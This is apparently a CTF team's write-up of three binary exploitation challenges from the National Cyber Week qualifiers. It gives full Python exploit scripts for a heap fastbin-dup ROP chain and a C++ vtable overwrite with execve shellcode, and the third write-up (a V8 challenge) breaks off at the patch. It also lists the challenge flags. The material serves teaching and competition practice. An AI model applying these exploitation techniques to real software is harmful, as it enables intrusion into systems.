# National Cyber Week Quals

{% hint style="info" %}
Team: <mark style="color:blue;">**Times heals all sorrows Get over, no worries ‘Cause nothing is more precious than love Nobel, faithful, she is as pure as the driven snow Oh dear heart, so sweet**</mark>

Rank: <mark style="color:yellow;">9</mark> / <mark style="color:yellow;">54</mark>
{% endhint %}

<table><thead><tr><th width="206">Challenge</th><th width="309">Category</th><th width="124" align="center">Points</th><th align="center">Solves</th></tr></thead><tbody><tr><td>gandalf</td><td>Binary Exploitation</td><td align="center">491 pts</td><td align="center">4</td></tr><tr><td>KaZooYa</td><td>Binary Exploitation</td><td align="center">496 pts</td><td align="center">3</td></tr><tr><td>veight</td><td>Binary Exploitation</td><td align="center">500 pts</td><td align="center">0</td></tr></tbody></table>

## gandalf

### Description

> You are currently playing as Gandalf, a powerful wizard known for exorcising, hunting, and even striking deals with devils or dark spirits. Recently, a friend entrusted you with a Dybbuk Box, an ancient and cursed artifact that holds dark spirits within. To destroy the malevolent entities trapped inside, you need to craft a powerful spell. However, the box is sealed with several intricate locks that must be bypassed before you can open it and confront the chained spirits, putting an end to their dark influence once and for all.
>
> Author: Brandy
>
> `nc 103.145.226.92 24234`

### Analysis

we're given the following files

```bash
└──╼ [★]$ tree .
.
├── gandalf
└── libc.so.6
```

```bash
└──╼ [★]$ file gandalf 
gandalf: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./ld-2.35.so, for GNU/Linux 3.2.0, BuildID[sha1]=9ea52cebbb133f5d4c20f131f5a76514318adc12, stripped
└──╼ [★]$ pwn checksec gandalf 
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'.'
```

the program is divided into 2 stage, locked and unlocked each with different interface to interact with.

{% hint style="info" %}
since's the binary is stripped, the function names below are renamed based on my understanding
{% endhint %}

in the main function we can see that a call to `prefix()` has to return 1 in order to continue to the next stage

```c

undefined8 main(void)

{
  // snippet ...
  init();
  print_banner();
  p = prefix();
  if (p != 1) {
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  do {
    // snippet ...
  } while (c != 6);
  
  // snippet ...
}


```

this is the interface we're dealing with in the locked stage

<figure><img src="../../.gitbook/assets/image (237).png" alt="" width="451"><figcaption></figcaption></figure>

the first and fourth option does nothing, the third option provides a format string vuln but I don't find a way for it to return 1, so I take it as a bait

```c
void fmstr_expl(void)
{
  // ... snippet
  fgets(local_78,100,stdin);
  printf("[+] Your feedback: ");
  printf(local_78);
  // ... snippet
}
```

the only way to continue to the next stage is through the second option

```c
undefined4 correct_bruv(void)
{
  int iVar1;
  
  iVar1 = guess_game();
  if (iVar1 == 1) {
    return 1;
  }
                    /* WARNING: Subroutine does not return */
  exit(0);
}

bool guess_game(void)
{
  // ...snippet
  iVar1 = seed();
  // ...snippet
  printf("[$] ");
  fgets(local_38,40,stdin);
  guess = atoi(local_38);
  // ...snippet
  if (guess == 0) {
    // ...snippet
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  if (guess != iVar1) {
    // ...snippet
  }
  else {
    // ...snippet
  }
  // ...snippet 
  return guess == iVar1;
}

int DAT_001070a0  = 0x108a
int seed(void) {
  // ... snippet
  tVar4 = time((time_t *)0x0);
  srand((uint)tVar4);
  iVar2 = rand();
  iVar2 = DAT_001070a0 + (DAT_001070a0 ^ iVar2 % 0x2ad) * 7;
  uVar1 = DAT_001070a0 * 3;
  iVar3 = rand();
  iVar2 = (uVar1 ^ iVar2 % 10000) + iVar3 % 100;
  if (iVar2 < 1) {
    iVar2 = -iVar2;
  }
  return iVar2 % 10000;
}
```

the seed is determined using the current time and thus can be replicated, we can predict the random number easily.

this is the interface when we continue to the unlock stage where it became the typical CRUD Heap challenge, without the Update

<figure><img src="../../.gitbook/assets/image (238).png" alt="" width="440"><figcaption></figcaption></figure>

first option is the show option

```c
void read_warning(ulong param_1)

{
  ulong local_10;
  
  local_10 = param_1;
  puts("");
  puts("Gandalf opened his backpack to use the crafted spell...");
  printf("Backpack slot: ");
  __isoc99_scanf("%lu",&local_10);
  getchar();
  if (local_10 < 0xe) {
    puts(BACKPACK[local_10]);
  }
  else {
    puts("[+] Invalid Slot.");
  }
  return;
}


```

second option is the allocate option

```c
void lockpicking(ulong param_1,size_t param_2)
{
  char *chunk;
  size_t size;
  ulong local_20 [2];
  ulong idx;
  
  size = param_2;
  local_20[0] = param_1;
  FUN_00102463();
  puts("");
  puts("Gandalf slots are limited to 13.");
  printf("[+] Choose backpack slot: ");
  __isoc99_scanf("%lu",local_20);
  getchar();
  if (local_20[0] < 0xe) {
    puts("[#] Gandalf has limit for manna usage.");
    puts("[#] For manna usage is limited from (21 - 1056).");
    printf("[+] Manna usage: ");
    __isoc99_scanf("%lu",&size);
    getchar();
    idx = local_20[0];
    chunk = (char *)malloc(size);
    BACKPACK[idx] = chunk;
    puts("[#] Enter magic phrase");
    printf(">> ");
    fgets(BACKPACK[local_20[0]],(int)size,stdin);
  }
  else {
    puts("[+] Invalid Slot.");
  }
  return;
}
```

third option is the free option and where the vulnerability lies because the pointer is not cleared enabling UAF

```c
void feedback(ulong param_1)
{
  ulong local_10;
  
  local_10 = param_1;
  banner_Stuff();
  puts("");
  puts("");
  printf("Choose backpack slot: ");
  __isoc99_scanf("%lu",&local_10);
  getchar();
  if (local_10 < 14) {
    free(BACKPACK[local_10]);
  }
  else {
    puts("[+] Invalid Slot.");
  }
  return;
}


```

the fifth option does nothing while the fourth option exits and sixth option returns.

I also want to mentioned that the binary applies seccomp

```bash
└──╼ [★]$ sudo seccomp-tools dump ./gandalf
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x06 0xffffffff  if (A != 0xffffffff) goto 0011
 0005: 0x15 0x04 0x00 0x00000000  if (A == read) goto 0010
 0006: 0x15 0x03 0x00 0x00000001  if (A == write) goto 0010
 0007: 0x15 0x02 0x00 0x00000002  if (A == open) goto 0010
 0008: 0x15 0x01 0x00 0x00000005  if (A == fstat) goto 0010
 0009: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0011
 0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0011: 0x06 0x00 0x00 0x00000000  return KILL
```

### Exploitation

first, to pass the locked stage we simply need to replicate the seed and reverse the random number generation, I wrote the following function to do so:

```python
SOME_GLOBAL = 0x0000108a 
def gen_rand():
    lib.srand(lib.time(None))

    iVar2 = lib.rand()
    iVar2 = SOME_GLOBAL + (SOME_GLOBAL ^ iVar2  % 0x2ad) * 7
    uVar1 = SOME_GLOBAL * 3;
    iVar3 = lib.rand()
    iVar2 = (uVar1 ^ iVar2 % 10000) + iVar3 % 100
    if (iVar2 < 0):
        iVar2 = -iVar2
    return iVar2 % 10000
```

next since this is a heap challenge, seccomp will actually use quite a lot of heap space, can be seen in the bins below

<figure><img src="../../.gitbook/assets/image (239).png" alt=""><figcaption></figcaption></figure>

so in order to make the exploitation easier to debug, I cleaned the bins first

```python
# clean bins
for _ in range(16):
    alloc(0, 0x20-0x10, b'a\n')
for _ in range(16):
    alloc(0, 0x70-0x10, b'a\n')
for _ in range(15):
    alloc(0, 0x80-0x10, b'a\n')
for _ in range(5):
    alloc(0, 0xd0-0x10, b'a\n')
for _ in range(2):
    alloc(0, 0xf0-0x10, b'a\n')
```

with the bins cleaned, I utilize UAF to get an easy libc leak through unsorted bin and heap leak

```python
alloc(0, 0x410, b'idk\n')
alloc(1, 0x10, b'guard\n')
free(0)
show(0)
libc.address = u64(io.recvline().strip().ljust(8, b'\x00')) - 0x219ce0

alloc(0, 0x410, b'idk\n')
free(1)
show(1)
heap = (u64(io.recvline().strip().ljust(8, b'\x00')) - 1) << 12
```

because of seccomp, we're forced to do an ORW ROP, to do this we need an arbitrary read to environ and arbitrary write to write the ROP payload. &#x20;

we'll achieve it through tcache poisoning, but without the edit function how are we gonna achieve this?

we can do this through `double free`, but since libc is 2.35, double free on the tcache will not work, however it is still applicable through the fastbin thus the technique `fastbin dup`&#x20;

first we'll allocate the tcache to its max size (7) and then link 3 chunk into fastbin with the pattern A - B - A to cause a double free

```python
for i in range(9):
    alloc(i, 0x10, b'a\n')
for i in range(9):
    free(i)
free(7)
```

<figure><img src="../../.gitbook/assets/Screenshot 2024-10-11 183632.png" alt=""><figcaption></figcaption></figure>

to profit, since tcache takes priority, we'll just need to consume all the tcache and then proceed to overwrite the first fastbin's 8 bytes with the target/address you want to achieve read/write, in this case I want to gain arb read to environ to leak stack

```python
for i in range(7):
    alloc(i, 0x10, b'a\n')
alloc(7, 0x10, p64(mangle(heap+0x1b10, libc.sym['environ'])) + b'\n')
alloc(8, 0x10, b'a\n')
alloc(9, 0x10, b'a\n')
```

<figure><img src="../../.gitbook/assets/Screenshot 2024-10-11 184243.png" alt=""><figcaption></figcaption></figure>

now we can allocate one more chunk to gain access to it, however notice that the allocate function uses `fgets` to take input, this means we have to overwrite the contents of it possibly deleting the stack address, even a new line will make the it NULL terminated and `puts` will unable to print it.

to bypass this we can easily request malloc of size 0x0, this will make malloc default to return a chunk of size 0x20 but since the size passed to `fgets` is still 0x0, we are not going to input anything to it.

```python
alloc(10, 0x0, b'')

show(10)
stack = u64(io.recvline().strip().ljust(8, b'\x00'))
rip = stack - 0x150
```

next using the same technique we'll write ROP payload to the stack, however we can't do this within the main's stack frame, this is because before returning, the binary will call `sleep()` which is not allowed by the seccomp

```c
undefined8 main(void)
{
  // ... snippet
    case 6:
      puts("");
      printf("\x1b[1;33m");
      puts("[#] The game quits in 3 seconds.");
      puts("[#] ..1");
      sleep(1);
      puts("[#] ..2");
      sleep(1);
      puts("[#] ..3");
      sleep(1);
      printf("\x1b[0m");
      goto ret;
    // ... snippet
}


```

which means if wanted to ROP it must be from the stack frame of the `fgets` call inside the second option's function.

another thing to note is that fastbin holds a maximum size of 88 bytes chunks, which is not big enough for an ORW ROP payload. to get around this, we will write a shorter ROP payload that calls read which then followed by the bigger ORW ROP.&#x20;

here's the exploit being ran againts remote

<figure><img src="../../.gitbook/assets/Screenshot 2024-10-11 190321.png" alt=""><figcaption></figcaption></figure>

below is the full exploit:

{% code title="exploit.py" %}
```python
#!/usr/bin/env python3
from pwn import *
from ctypes import CDLL
import time

# =========================================================
#                          SETUP                         
# =========================================================
exe = './gandalf_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
lib = CDLL("/lib/x86_64-linux-gnu/libc.so.6")
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = '103.145.226.92', 24234

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        context.log_level = 'info'
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg

# call to malloc
# breakrva 0x2be0

# breakrva 0x2c4f
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# └──╼ [★]$ pwn checksec gandalf
#     Arch:     amd64-64-little
#     RELRO:    Full RELRO
#     Stack:    Canary found
#     NX:       NX enabled
#     PIE:      PIE enabled
#     RUNPATH:  b'.'

# └──╼ [★]$ sudo seccomp-tools dump ./gandalf
#  line  CODE  JT   JF      K
# =================================
#  0000: 0x20 0x00 0x00 0x00000004  A = arch
#  0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011
#  0002: 0x20 0x00 0x00 0x00000000  A = sys_number
#  0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
#  0004: 0x15 0x00 0x06 0xffffffff  if (A != 0xffffffff) goto 0011
#  0005: 0x15 0x04 0x00 0x00000000  if (A == read) goto 0010
#  0006: 0x15 0x03 0x00 0x00000001  if (A == write) goto 0010
#  0007: 0x15 0x02 0x00 0x00000002  if (A == open) goto 0010
#  0008: 0x15 0x01 0x00 0x00000005  if (A == fstat) goto 0010
#  0009: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0011
#  0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW
#  0011: 0x06 0x00 0x00 0x00000000  return KILL

SOME_GLOBAL = 0x0000108a 
def gen_rand():
    lib.srand(lib.time(None))

    iVar2 = lib.rand()
    iVar2 = SOME_GLOBAL + (SOME_GLOBAL ^ iVar2  % 0x2ad) * 7
    uVar1 = SOME_GLOBAL * 3;
    iVar3 = lib.rand()
    iVar2 = (uVar1 ^ iVar2 % 10000) + iVar3 % 100
    if (iVar2 < 0):
        iVar2 = -iVar2
    return iVar2 % 10000

def alloc(idx, size, data):
    io.sendlineafter(b'$', b'2')
    io.sendlineafter(b':', str(idx).encode())
    io.sendlineafter(b':', str(size).encode())
    io.sendafter(b'>>', data)

def free(idx):
    io.sendlineafter(b'$', b'3')
    io.sendlineafter(b':', str(idx).encode())

def show(idx):
    io.sendlineafter(b'$', b'1')
    io.sendlineafter(b':', str(idx).encode())

def mangle(heap_addr, val):
    return (heap_addr >> 12) ^ val

def exploit():
    global io
    io = initialize()
    rop = ROP(libc)

    POP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0]
    POP_RSI = rop.find_gadget(['pop rsi', 'ret'])[0]
    POP_RAX = rop.find_gadget(['pop rax', 'ret'])[0]
    POP_RDX_RBX = rop.find_gadget(['pop rdx', 'pop rbx', 'ret'])[0]
    SYSCALL_RET = rop.find_gadget(['syscall', 'ret'])[0]

    io.recvuntil(b'[+]')
    
    io.sendlineafter(b'[!]', b'2')
    num = gen_rand()
    io.sendlineafter(b'[$]', str(num).encode())

    # clean bins
    for _ in range(16):
        alloc(0, 0x20-0x10, b'a\n')
    for _ in range(16):
        alloc(0, 0x70-0x10, b'a\n')
    for _ in range(15):
        alloc(0, 0x80-0x10, b'a\n')
    for _ in range(5):
        alloc(0, 0xd0-0x10, b'a\n')
    for _ in range(2):
        alloc(0, 0xf0-0x10, b'a\n')

    alloc(0, 0x410, b'idk\n')
    alloc(1, 0x10, b'guard\n')
    free(0)
    show(0)
    libc.address = u64(io.recvline().strip().ljust(8, b'\x00')) - 0x219ce0

    POP_RDI = libc.address + POP_RDI
    POP_RSI = libc.address + POP_RSI
    POP_RAX = libc.address + POP_RAX
    POP_RDX_RBX = libc.address + POP_RDX_RBX
    SYSCALL_RET = libc.address + SYSCALL_RET

    alloc(0, 0x410, b'idk\n')
    free(1)
    show(1)
    heap = (u64(io.recvline().strip().ljust(8, b'\x00')) - 1) << 12

    # fastbin attack to control tcache->next
    for i in range(9):
        alloc(i, 0x10, b'a\n')
    for i in range(9):
        free(i)
    free(7)
    for i in range(7):
        alloc(i, 0x10, b'a\n')
    alloc(7, 0x10, p64(mangle(heap+0x1b10, libc.sym['environ'])) + b'\n')
    alloc(8, 0x10, b'a\n')
    alloc(9, 0x10, b'a\n')
    alloc(10, 0x0, b'')

    show(10)
    stack = u64(io.recvline().strip().ljust(8, b'\x00'))
    rip = stack - 0x150

    # fastbin to ROP
    for i in range(9):
        alloc(i, 0x70, b'a\n')
    for i in range(9):
        free(i)
    free(7)
    for i in range(7):
        alloc(i, 0x70, b'a\n')
    alloc(7, 0x70, p64(mangle(heap+0x1b10, rip-0x8)) + b'\n')
    alloc(8, 0x70, b'./flag.txt\x00\n')
    alloc(9, 0x70, b'a\n')

    payload = flat([
        0x0,
        POP_RDI,
        0x0,
        POP_RSI,
        stack-0x100,
        POP_RDX_RBX,
        0x400,
        0x0,
        POP_RAX,
        0x0,
        SYSCALL_RET,
    ])
    pause() if args.GDB else None
    alloc(10, 0x70, payload + b'\n')

    payload = flat([
        POP_RDI,
        heap+0x1f50,
        POP_RSI,
        0x0,
        POP_RAX,
        0x2,
        SYSCALL_RET,

        POP_RDI,
        0x3,
        POP_RSI,
        stack,
        POP_RDX_RBX,
        0x100,
        0x0,
        POP_RAX,
        0x0,
        SYSCALL_RET,

        POP_RDI,
        0x1,
        POP_RAX,
        0x1,        
        SYSCALL_RET
    ])
    io.send(payload)

    log.success("libc base: %#x", libc.address)
    log.success("heap base; %#x", heap)
    log.success("stack: %#x", stack)
    log.success("rip: %#x", rip)
    io.interactive()
    
if __name__ == '__main__':
    exploit()
```
{% endcode %}

{% hint style="success" %}
Flag: _**NCW{b1c3a7d9e8f4a2b6c9e7d5a3b8f1c2e4d7b9a8c1f5e6a2b9d4c7e5b3a8d9c2f4b7e1a3c6d8f2a7b5e9c1d3f6a4b7e2c5d9a1f3e7d6b8c2a4e9d1f5b3c7a6d2e8b4c1f9d5b7a2c3e4f8b9d6a1c5e7d3b8a9c2f4d1b5e6c3a7d9b8c4f1e2a6d5b3e7c9f2d8a1c3e5b7d6a9f4e2c1b8d7f3a5}**_
{% endhint %}

## KaZooYa

### Description

> Everything's digitalized nowadays, I think it's time a zoo too.
>
> Author: Xovert
>
> `nc 103.145.226.92 7272`

### Analysis

given the following files

```bash
└──╼ [★]$ tree .
.
├── chall
├── Dockerfile
```

```bash
└──╼ [★]$ file chall
chall: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=496d18f15930c7aac759d5f634876fdcdcdf3aab, for GNU/Linux 3.2.0, not stripped
└──╼ [★]$ pwn checksec chall
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

running the binary, we're greeted with an address leak and these options&#x20;

<figure><img src="../../.gitbook/assets/Screenshot 2024-10-11 223852 (1).png" alt="" width="563"><figcaption></figcaption></figure>

I tried to decompile the binary in ghidra, but it turns out its made out of C++ and ghidra is not clean, so its time for IDA to shine

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  __int64 v3; // rax
  __int64 v4; // rax
  __int64 v5; // rax
  __int64 v6; // rax
  int v8; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v9; // [rsp+8h] [rbp-8h]

  v9 = __readfsqword(0x28u);
  init();
  v8 = 0;
  v3 = std::operator<<<std::char_traits<char>>(&std::cout, "Your buf is at: ");
  v4 = std::ostream::operator<<(v3, globalbuf);
  std::ostream::operator<<(v4, &std::endl<char,std::char_traits<char>>);
  while ( 1 )
  {
    printMenu();
    std::operator<<<std::char_traits<char>>(&std::cout, ">> ");
    std::istream::operator>>(&std::cin, &v8);
    switch ( v8 )
    {
      case 1:
        addMenu();
        continue;
      case 2:
        if ( (unsigned __int8)std::vector<Animal *>::empty((__int64)animalList) )
          goto EMPTY;
        listAnimal();
        break;
      case 3:
        if ( (unsigned __int8)std::vector<Animal *>::empty((__int64)animalList) )
          goto EMPTY;
        hearSound();
        break;
      case 4:
        if ( (unsigned __int8)std::vector<Animal *>::empty((__int64)animalList) )
        {
EMPTY:
          v5 = std::operator<<<std::char_traits<char>>(&std::cout, "... The zoo is empty");
          std::ostream::operator<<(v5, &std::endl<char,std::char_traits<char>>);
        }
        else
        {
          editName();
        }
        break;
      case 5:
        feedback();
        break;
      case 6:
        exit(1);
      default:
        v6 = std::operator<<<std::char_traits<char>>(&std::cout, "Did you mash your keyboard?");
        std::ostream::operator<<(v6, &std::endl<char,std::char_traits<char>>);
        break;
    }
  }
}
```

we can see that the leaked address is a global variable called `globalbuf`, taking a look at `init()` reveals that `globalbuf` contains an mmap'ed rwx address. &#x20;

```c
unsigned __int64 init(void)
{
  unsigned __int64 v1; // [rsp+8h] [rbp-8h]

  v1 = __readfsqword(0x28u);
  std::vector<Animal *>::reserve(animalList, 4LL);
  globalbuf = mmap(0LL, 0x3000uLL, 7, 34, -1, 0LL);
  if ( globalbuf == (void *)-1LL )
  {
    puts("Mmap failed");
    exit(1);
  }
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  return v1 - __readfsqword(0x28u);
}
```

in IDA we can see that `globalbuf` is referenced by `getstr`&#x20;

<figure><img src="../../.gitbook/assets/Screenshot 2024-10-11 230757.png" alt=""><figcaption></figcaption></figure>

```c
unsigned __int64 __fastcall getstr(unsigned __int64 a1)
{
  unsigned __int64 i; // [rsp+10h] [rbp-10h]

  std::operator<<<std::char_traits<char>>(&std::cout, ">> ");
  for ( i = 0LL; i < a1 && i <= 0x2FFF; ++i )
  {
    if ( read(0, (char *)globalbuf + i, 1uLL) < 0 )
      exit(-1);
    if ( *((_BYTE *)globalbuf + i) == 10 )
    {
      *((_BYTE *)globalbuf + i) = 0;
      return i;
    }
  }
  return 0LL;
}
```

which is called in two functions, `editName` and `feedback`

```c
unsigned __int64 editName(void)
{
  // ... snippet
  v4 = std::operator<<<std::char_traits<char>>(&std::cout, "What's the new name?");
  std::ostream::operator<<(v4, &std::endl<char,std::char_traits<char>>);
  n = getstr(0x50uLL);
  if ( v9 == 1 )
  {
      // ... snippet
        memcpy(*(void **)(*(_QWORD *)v17 + 8LL), globalbuf, n);
      }
      // ... snippet
  }
  else if ( v9 == 2 )
  {
    // ... snippet
    {
      // ... snippet
      {
        memcpy(*(void **)(*(_QWORD *)v15 + 8LL), globalbuf, n);
      }
      // ... snippet
    }
  }
  // ... snippet
}

unsigned __int64 feedback(void)
{
  // ... snippet
  v0 = std::operator<<<std::char_traits<char>>(
         &std::cout,
         "We are by no means perfect, please provide some feedbacks for future improvements!");
  std::ostream::operator<<(v0, &std::endl<char,std::char_traits<char>>);
  getstr(0x30uLL);
  return v2 - __readfsqword(0x28u);
}
```

in `init` I also take notice that there's an vector of type `Animal` reserved for length of 4. as you'll see later there's also a class called `Monke` and `Cat` whjch I assumed they're inherited from `Animal`

I won't bother with decompilation of other of the options as it is quite messy, and with C++ I much prefer dynamic analysis

in short, we can interact with each of the option using the functions below:

```python
MONKE = 1
CAT = 2

def add(type, name, sound, weight, enum):
    io.sendlineafter(b'>>', b'1')
    pass

def show():
    io.sendlineafter(b'>>', b'2')

def hear(type, idx):
    io.sendlineafter(b'>>', b'3')
    pass

def edit(type, idx, name):
    io.sendlineafter(b'>>', b'4')
    pass

def feedback(feedback):
    io.sendlineafter(b'>>', b'5')
    pass
```

I want to mention at this point I had read a bit on reversing C++ objects from these 2 blog:

{% embed url="https://blog.0xbadc0de.be/archives/67" %}

{% embed url="https://rioasmara.com/2020/05/24/reversing-c-object/" %}

one thing that stood out to me while reading it is that in every instantiated object, the first 8 bytes always points to the respective class vtable. I wanted to clarify this and also get a bigger picture of the object's attributes

if I create a `Monke` and `Cat` class as follow

```python
add(CAT, b'catsname', b'catsound', 0x77, 0x99)
add(MONKE, b'monkesname', b'monkesound', 0x44, 0x11)
```

we end up with the following chunks

<figure><img src="../../.gitbook/assets/Screenshot 2024-10-11 231727.png" alt=""><figcaption></figcaption></figure>

the first 0x30 sized chunk is the reserved vector while each of the 0x70 chunks are objects and the 0x20 sized chunks are the object name's attribute

<figure><img src="../../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>

we can see that both `Monke` and `Cat` has the same composition derived from `Animal` that can be summarised below

<figure><img src="../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

there are NULLs and other values that I'm not sure, but I decide to take it for granted.

when we choose the option to `hearSound` it is actually do some derefencing to the vtable to call the appropriate method

```c
unsigned __int64 hearSound(void)
{
  // ...snippet
  if ( v8 == 1 )
  {
    // ...snippet
    (*(void (__fastcall **)(_QWORD))(*(_QWORD *)*v15 + 8LL))(*v15);
    }
  }
  else if ( v8 == 2 )
  {
    // ...snippet
        (*(void (__fastcall **)(_QWORD))(*(_QWORD *)*v13 + 8LL))(*v13);
    }
  }
  // ...snippet
}
```

<figure><img src="../../.gitbook/assets/Screenshot 2024-10-12 000010.png" alt=""><figcaption></figcaption></figure>

examining in GDB, first is to dereference the object and take the vtable address

<figure><img src="../../.gitbook/assets/Screenshot 2024-10-12 000145.png" alt=""><figcaption></figcaption></figure>

then it adds the offset to the table which corresponds to the method it wants to call, in this case it corresponds to `makeSound`

<figure><img src="../../.gitbook/assets/Screenshot 2024-10-12 000226.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/Screenshot 2024-10-12 000257.png" alt=""><figcaption></figcaption></figure>

### Exploitation

the vulnerability here is Heap Overflow, using the example in analysis we can see that name occupies a 0x20 sized chunk

<figure><img src="../../.gitbook/assets/Screenshot 2024-10-11 235309.png" alt=""><figcaption></figcaption></figure>

however in `editName`, memcpy copies the amount whatever amount that was returned by prior `getstr` which is hard coded to input a size of 0x50.  we can see this in action

```python
add(CAT, b'catsname', b'catsound', 0x77, 0x99)
edit(CAT, 0, b'A'*30)
```

<figure><img src="../../.gitbook/assets/Screenshot 2024-10-11 235554.png" alt=""><figcaption></figcaption></figure>

this means we can control the vtable and control what the binary will call upon `hearSound`, since we have an rwx page, we can put the shellcode there using `getStr` in `feedback` and make the object jumps there.

notice that the method that is called is in the 2nd index, so we need to put our shellcode address in the 2nd index of the table.

to do this, the rwx region will act as both the vtable and the place where our shellcode resides.&#x20;

```
rwx_page = p64(0x0) + P64(&rwx_page+16) + [...shellcode]
          ^rwx*(0*8)        ^rwx*(1*8)       ^rwx*(2*8)
```

we'll use `editName` to overwrite the vtable and `feedback` to setup the vtable and shellcode

```python
payload = b'a' * 0x18 + p64(0x71) + p64(rwx)
edit(CAT, 0, payload)

payload = p64(0x0) + p64(rwx+0x10) + shellcode
feedback(payload)
hear(CAT, 1)
```

here's the exploit being ran againts remote

<figure><img src="../../.gitbook/assets/Screenshot 2024-10-11 190430.png" alt="" width="563"><figcaption></figcaption></figure>

below is the full exploit:

{% code title="exploit.py" %}
```python
#!/usr/bin/env python3
from pwn import *
from subprocess import run

# =========================================================
#                          SETUP                         
# =========================================================
exe = './chall_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = '103.145.226.92', 7272

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg

# edit's memcpy
# breakrva 0x314a
# breakrva 0x321c

# CAT's hearsound
breakrva 0x2e83
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
MONKE = 1
CAT = 2

def add(type, name, sound, weight, enum):
    io.sendlineafter(b'>>', b'1')
    io.sendlineafter(b'>>', str(type).encode())
    io.sendlineafter(b':', name)
    io.sendlineafter(b':', sound)
    io.sendlineafter(b':', str(weight).encode())
    io.sendlineafter(b':', str(enum).encode())

def show():
    io.sendlineafter(b'>>', b'2')

def hear(type, idx):
    io.sendlineafter(b'>>', b'3')
    io.sendlineafter(b'>>', str(type).encode())
    io.sendlineafter(b'>>', str(idx).encode())

def edit(type, idx, name):
    io.sendlineafter(b'>>', b'4')
    io.sendlineafter(b'>>', str(type).encode())
    io.sendlineafter(b'>>', str(idx).encode())
    io.sendlineafter(b'>>', name)

def feedback(feedback):
    io.sendlineafter(b'>>', b'5')
    io.sendlineafter(b'>>', feedback)

def exploit():
    global io
    
    run("nasm -f bin shellcode.asm -o shellcode.bin", shell=True, check=True)
    shellcode = open("shellcode.bin", "rb").read()
    
    io = initialize()

    io.recvuntil(b'at: 0x')
    rwx = int(io.recvline().strip(), 16)

    add(CAT, b'aaaa', b'bbbb', 77, 77)
    add(CAT, b'cccc', b'dddd', 77, 77)

    payload = b'a' * 0x18 + p64(0x71) + p64(rwx)
    edit(CAT, 0, payload)

    payload = p64(0x0) + p64(rwx+0x10) + shellcode
    feedback(payload)
    hear(CAT, 1)

    log.success("rwx: %#x", rwx)
    io.interactive()
    
if __name__ == '__main__':
    exploit()
```
{% endcode %}

{% code title="shellcode.asm" %}
```asm6502
    BITS 64
    DEFAULT REL

    section .text
    global _start

_start:
    lea rdi, [sh]
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 0x3b
    syscall

sh: db "/bin/sh", 0
```
{% endcode %}

{% hint style="success" %}
Flag: _**NCW{f5dd5940e67302053400694fbc4564a5e8d783a6f3a8cf0859450b5ff1d4a03a}**_
{% endhint %}

## veight

### Description

> Goal run "/readflag"
>
> Author: Enryu
>
> `nc 103.145.226.92 11101`

<details>

<summary>Hint 1</summary>

Ini basic v8 exploit sih dan jangan terlalu overthinking, build dulu version debugnya 12.7.1, belajar dulu bang di [https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/](https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/) walaupun tidak sama tetap bisa bersatu, dulu 64-bit sekarang 32-bit

</details>

{% hint style="info" %}
my first V8 pwn :D
{% endhint %}

### Analysis

{% hint style="info" %}
The writeup assumes the reader has basic knowledge about V8 exploitation, if you're not familiar with it I suggest these two resource that I used to solve this challenge:

* [https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/](https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/)
* [https://www.youtube.com/watch?v=Uyrv2F6wI-E](https://www.youtube.com/watch?v=Uyrv2F6wI-E)
{% endhint %}

we're given the following files

```bash
└──╼ [★]$ tree .
.
├── args.gn
├── chall.zip
├── d8
├── snapshot_blob.bin
└── v8.patch
```

this is the content of `args.gn`

```gn
dcheck_always_on = false
is_debug = false
target_cpu = "x64"
v8_enable_object_print = true
v8_enable_sandbox = false
```

and here's the patch

{% code title="builtins-array.cc" %}
```diff
diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc
index 61e1c36b830..c73361d815a 100644
